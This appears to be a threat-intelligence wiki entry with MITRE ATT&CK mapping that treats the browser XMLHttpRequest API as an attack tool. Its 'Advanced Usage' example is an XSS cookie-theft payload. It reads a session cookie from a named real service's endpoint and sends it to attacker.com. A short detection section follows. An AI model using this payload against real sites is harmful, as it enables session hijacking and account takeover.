---
url: null
tags:
  - javascript-api
  - http-client
type: tool
verified: false
platforms:
  - Web
id: 2df07f68-0445-4ddf-a2d3-c8af40b84681
created_at: '2025-12-14T17:33:34.365Z'
updated_at: '2025-12-14T17:33:34.365Z'
validated: true
submitted: true
---
# XMLHttpRequest-for-Credentialed-Requests

**Status**: Unverified

## Overview

XMLHttpRequest (XHR) is a built-in JavaScript API for making asynchronous HTTP requests, often used in attacks to send credentialed requests across origins and exfiltrate data.

## Description

In web exploits like XSS, XHR allows querying internal endpoints (e.g., cookie retrieval) with withCredentials=true to include session cookies, then forwarding responses to attacker servers for theft.

## Features

- Feature 1: Supports GET/POST with custom headers and credentials
- Feature 2: onload callbacks for handling responses dynamically
- Feature 3: Native to all modern browsers, no external dependencies

## Installation

### Requirements

- JavaScript environment (browser)

### Install Commands

No installation; native API:
```javascript
var xhr = new XMLHttpRequest();
```

## Basic Usage

```javascript
xhr.open('GET', 'url', true);
xhr.send();
```

### Common Options

| Option | Description |
|--------|-------------|
| `withCredentials = true` | Send cookies for cross-origin |
| `onload` | Callback for response handling |
| `open(method, url, async)` | Initialize request |

## Examples

### Example 1: Basic Usage

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://example.com/data', true);
xhr.send();
```

### Example 2: Advanced Usage

```javascript
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://gnar.grammarly.com/cookies?name=grauth', true);
xhr.withCredentials = true;
xhr.onload = function() {
  // Exfil
  var ex = new XMLHttpRequest();
  ex.open('GET', 'https://attacker.com/' + this.responseText);
  ex.send();
};
xhr.send();
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Steal Web Session Cookie]]
- [[JavaScript]]

### Tactics

- [[Collection]]

## Detection

Indicators and methods for detecting this tool's usage:

- WAF logs for credentialed XHR from injected scripts
- Anomalous GET requests to internal /cookies endpoints

## Related Procedures

- [[procedures/Inject-Script-to-Steal-Session-Cookies-via-XSS]]

## Related Tools

- [[tools/jQuery-for-Cross-Domain-AJAX]]

## References

- MDN Documentation: https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest
